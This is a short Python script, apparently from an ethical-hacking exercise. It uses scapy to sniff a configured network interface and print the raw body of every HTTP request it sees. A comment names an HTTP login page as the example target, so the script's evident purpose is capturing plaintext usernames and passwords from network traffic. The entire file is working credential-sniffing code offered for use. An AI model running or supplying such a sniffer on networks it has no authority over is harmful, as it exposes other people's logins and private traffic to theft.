#!/usr/bin/env python3

# HTTP login example site: http://www.geonames.org/login

import scapy.all as scapy
from scapy.layers import http

from configparser import ConfigParser
parser = ConfigParser()
parser.read('config.ini')
interface = parser.get('main', 'interface')

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		if packet.haslayer(scapy.Raw):
			print(packet[scapy.Raw].load)

sniff(interface)
